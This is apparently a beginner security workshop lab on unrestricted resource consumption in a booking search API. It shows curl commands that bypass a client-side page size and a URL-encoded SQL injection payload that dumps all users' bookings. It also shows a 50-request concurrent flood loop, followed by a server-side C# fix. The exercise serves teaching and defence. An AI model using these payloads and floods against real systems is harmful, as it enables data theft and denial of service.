# Exercise 05 — Uncontrolled Resource Consumption: Booking Search

**Difficulty:** Beginner  
**Category:** Uncontrolled Resource Consumption  
**OWASP Top 10:** A05:2021 — Security Misconfiguration / API4:2023 — Unrestricted Resource Consumption

---

## Scenario

The booking search endpoint (`GET /api/bookings/search?q=&pageSize=N`) accepts a caller-supplied `pageSize` and honours it without any server-side cap. An attacker can omit `pageSize` entirely (returns every row) or set it to `999999` to retrieve the full table in a single request. Combined with Lab 03's SQL injection, the same request can return **all bookings for all users** with no limit — loading arbitrarily large result sets into server memory.

---

## Background

**Uncontrolled resource consumption** occurs when an API does not enforce limits on the resources a single request can consume. Common forms include:

- No maximum page size — one request returns millions of rows
- No execution timeout — slow queries hold connections indefinitely
- No rate limiting — any user can send unlimited requests per second
- No request size limit — uploading arbitrarily large payloads

This vulnerability is distinct from SQL injection. Even with a perfectly parameterised query, returning 100 000 rows per request is a DoS risk. Both vulnerabilities exist independently on this endpoint; the workshop toggles them separately.

---

## Step 1 — Observe normal UI behaviour

The database is pre-seeded with 211 bookings for `partner` (212 total across all users).

Log in as `partner / Partner1234!` at `http://localhost:5173` and go to **Bookings**. Click **Search** with the hotel field empty. The results show 10 rows with a **"— showing first 10 results"** badge. This looks like a safe server-side limit.

It isn't. Open **DevTools → Network**, click the search request, and look at the URL:

```
/bff/bookings/search?q=&pageSize=10
```

The `pageSize=10` comes from the JavaScript — not from any server enforcement. Copy that URL, change `pageSize=10` to `pageSize=999999`, and paste it into the address bar. You'll bypass the UI and see all 211 rows returned.

Alternatively, inspect the outgoing request via curl:

```bash
# This is exactly what the UI sends
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=10" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 10, "truncated": true }` — only 10 returned because the client asked for 10 and the server honoured it. The limit lives entirely in the JavaScript, not on the server.

---

## Step 2 — Bypass the client-side limit

The `pageSize=10` is just a number in the query string. Any HTTP client can change it:

```bash
# Attacker asks for 999999 — server honours whatever number is sent
time curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=999999" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 211, "truncated": false }` — all 211 partner bookings returned.

```bash
# Or omit pageSize entirely — no cap applied at all
time curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 211, "truncated": false }` — same result.

Measure the response size:

```bash
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=999999" | wc -c
```

With 211 bookings the response is roughly 60–100 KB. Scale this to 100 000 bookings and a single bypassed request returns tens of megabytes.

---

## Step 3 — Combine with SQL injection for maximum impact

When SQL injection is also present (as in Lab 03), a single request can return **all bookings from all users** with no limit:

```bash
# SQL injection payload — bypasses the UserId filter
time curl -s -b cookies.txt \
  "http://localhost:5001/bff/bookings/search?q=%25%27%20OR%20%271%27%3D%271%27%20--" \
  | jq '{count: (.results | length), truncated}'
```

Without the resource cap, this returns every booking in the entire system — all users' card data, all dates, everything — in one response.

---

## Step 4 — Flood with concurrent requests

Even with only the caller's own bookings, concurrent requests exhaust server resources:

```bash
# 50 concurrent search requests
for i in $(seq 1 50); do
  curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" > /dev/null &
done
wait
echo "Done"
```

Each request allocates memory for all 211 booking objects. 50 concurrent requests × 211 objects × ~1 KB each = ~10 MB of live allocations simultaneously — plus the garbage collector pressure, thread pool saturation, and connection pool exhaustion.

Monitor memory during the flood:

```bash
ps aux | grep BookingDojo.Api | awk '{print $6 " KB RSS"}'
```

---

## Step 5 — Apply the fix

**File:** `src/BookingDojo.Api/Controllers/BookingsController.cs`  
**Method:** `SearchBookings`

> **Why the cap must be in the query, not after it**
>
> The vulnerable code runs a SQL query that fetches every matching row into server memory, _then_ trims the list before sending the response. The SQL already happened — the damage (memory allocation, DB work) is done. A fix that only trims the response is still a DoS vector. The correct fix applies `LIMIT` at the database level so the SQL never fetches more than `MaxResults + 1` rows.

**Remove** the entire vulnerable pagination block (the `sql` variable, the ADO.NET connection, reader, try/finally — already replaced in Lab 03), plus the client-controlled truncation at the end:

```csharp
// VULNERABLE — honours whatever pageSize the caller sends
var truncated = false;
if (pageSize.HasValue && pageSize.Value > 0 && results.Count > pageSize.Value)
{
    results = results.Take(pageSize.Value).ToList();
    truncated = true;
}

return Ok(new { results, truncated, appliedPageSize = pageSize });
```

**Replace the entire `SearchBookings` body** (building on the Lab 03 LINQ fix) with:

```csharp
var userId = Guid.Parse(User.FindFirstValue(JwtRegisteredClaimNames.Sub)!);

const int MaxResults = 10;

// userId and q are typed SQL parameters.
// Take(MaxResults + 1) adds LIMIT to the SQL query — the database never fetches
// more than 11 rows regardless of how many bookings the user has.
var query = _db.Bookings
    .Include(b => b.Hotel)
    .Where(b => b.UserId == userId);

if (!string.IsNullOrEmpty(q))
    query = query.Where(b => b.Hotel.Name.Contains(q));

var fetched = await query
    .OrderByDescending(b => b.CreatedAt)
    .Take(MaxResults + 1)
    .ToListAsync();

var truncated = fetched.Count > MaxResults;
var results = fetched
    .Take(MaxResults)
    .Select(b => ToDto(b, b.Hotel.Name))
    .ToList();

return Ok(new { results, truncated, appliedPageSize = pageSize });
```

EF Core translates this to:

```sql
SELECT ... FROM bookingdojo."Bookings" b
JOIN bookingdojo."Hotels" h ON b."HotelId" = h."Id"
WHERE b."UserId" = $1
  AND h."Name" LIKE $2      -- only when q is non-empty
ORDER BY b."CreatedAt" DESC
LIMIT 11
```

The database fetches at most 11 rows. Fetching one extra (`MaxResults + 1`) lets us detect truncation cheaply: if we got 11, there are more rows and `truncated = true`.

### How it works at runtime

```
GET /api/bookings/search?q=&pageSize=999999
        │
        ▼
SearchBookings(pageSize = 999999)
        │
        ├─ Without the fix: SQL fetches all rows, response trimmed after
        │       │
        │       └─► 211 rows loaded into memory, then Take(999999) = all 211 returned
        │
        └─ With the fix: LIMIT in SQL, pageSize ignored
                │
                ▼
           SQL: LIMIT 11 — DB fetches at most 11 rows
           fetched.Count = 11 → truncated = true
           results = first 10
                │
                └─► { results: [...10 items...], truncated: true }
                    memory proportional to 11 rows, not 211
```

---

## Step 6 — Verify

### 6.1 — Normal search still works

```bash
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=Beach" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 1, "truncated": false }` — partner's Beach Paradise booking.

### 6.2 — Large pageSize is ignored

```bash
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=999999" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 10, "truncated": true }` — server returns 10 regardless of what the caller requests.

### 6.3 — Omitting pageSize is also capped

```bash
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 10, "truncated": true }`.

---

## Step 7 — Discussion

| Control | Description | Applied here |
|---------|-------------|--------------|
| Result page size cap | Hard limit on records per response | ✓ (10 results) |
| Pagination | Client requests pages with offset/limit | Next step |
| Rate limiting | Max N requests per user per second | Middleware (not yet) |
| Query timeout | Kill queries running longer than N seconds | DB/EF Core timeout |
| Request body size limit | Reject oversized POST bodies | ASP.NET default (30 MB) |

**Why a hard cap and not just pagination?**

The `pageSize` parameter exists in the vulnerable version but the server honours whatever the caller sends. Setting `pageSize=999999` is indistinguishable from not having pagination at all. The fix must be a server-side hard limit that the client **cannot negotiate around** — the server decides the cap, the caller's `pageSize` is discarded.

**Independent vulnerabilities**

SQL injection (Lab 03) and uncontrolled resource consumption are separate vulnerabilities with separate root causes and separate fixes. Fixing one does not fix the other: a parameterised query with no row limit is still a DoS vector; an unparameterised query with a hard cap still leaks cross-user data.

---

## Key Takeaways

- **Fixing injection is not the same as fixing resource abuse.** A perfectly parameterised query with no row limit is still a DoS vector.
- **Client-controlled limits are not limits.** Any pagination `pageSize` the server honours without a hard cap can be set to `Integer.MAX_VALUE`.
- **Concurrent requests multiply the impact.** 50 users × unlimited results = unbounded memory regardless of per-user quotas.
- **The fix is a single server-side constant.** `Take(10)` costs one line of code; the absence of it can take down the server.

---

## Further Reading

- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [ASP.NET Core Rate Limiting middleware](https://learn.microsoft.com/en-us/aspnet/core/performance/rate-limit)
